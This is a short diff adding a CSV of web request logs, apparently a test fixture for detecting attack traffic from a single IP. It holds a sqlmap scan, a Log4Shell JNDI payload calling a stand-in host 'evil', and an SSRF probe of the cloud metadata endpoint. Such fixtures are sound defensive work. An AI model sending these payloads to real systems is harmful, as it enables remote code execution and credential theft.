@@ -1,0 +1,4 @@
+timestamp,method,url,user_agent,client_ip
+2026-06-19T10:00:00Z,GET,/,sqlmap/1.7,45.9.1.7
+2026-06-19T10:00:01Z,GET,/api?x=${jndi:ldap://evil},Mozilla/5.0,45.9.1.7
+2026-06-19T10:00:02Z,GET,/fetch?u=http://169.254.169.254/,Mozilla/5.0,45.9.1.7
